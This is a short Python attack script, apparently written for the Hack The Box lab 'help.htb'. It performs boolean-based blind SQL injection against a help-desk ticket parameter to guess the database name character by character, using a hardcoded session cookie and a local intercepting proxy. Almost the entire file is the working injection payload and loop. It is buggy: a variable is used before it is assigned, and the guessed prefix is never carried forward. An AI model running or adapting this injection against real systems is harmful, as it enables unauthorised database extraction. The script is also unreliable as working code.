import requests
import string
import warnings
#warnings.filterwarnings("ignore")

# url = "http://help.htb/support/?v=view_tickets&action=ticket&param[]=4&param[]=attachment&param[]=1&param[]=6+and+(select+1=1+from+dual+where+database()+like+'"
# MySQL Injection
# use elapsed time instead of length of response in case of blind time base sql injection
# print elapsed time
# print(response.elapsed)

proxies = {
   'http': 'http://127.0.0.1:8080',
   'https': 'http://127.0.0.1:8080',
}

headers = {'Cookie': 'lang=english; PHPSESSID=20q6sd4sfdodqrkk71u2cu7701; usrhash=0Nwx5jIdx%2BP2QcbUIv9qck4Tk2feEu8Z0J7rPe0d70BtNMpqfrbvecJupGimitjg3JjP1UzkqYH6QdYSl1tVZNcjd4B7yFeh6KDrQQ%2FiYFsjV6wVnLIF%2FaNh6SC24eT5OqECJlQEv7G47Kd65yVLoZ06smnKha9AGF4yL2Ylo%2BE9Ii3o9JpgVCP9bS6SPvZi%2FdLtAbPqlhBkIJ8uIYlKQw%3D%3D'}

def dbname():
	url = "http://help.htb/support/?v=view_tickets&action=ticket&param[]=4&param[]=attachment&param[]=1&param[]=6+and+(select+1=1+from+dual+where+database()+like+'"
	for i in range(1,7):
		i=i+1
		
		for a in string.ascii_lowercase + string.digits[1:]:
			part1 = url + a + "%25')+--+-"
			r = requests.get(part1, headers = headers, proxies=proxies, verify=False)
			t = r.content
			#print(len(t))

			if len(t) == 78881:
				print("dbname chars "+a)
				part2 = part2+a
				print(a)
			

dbname()
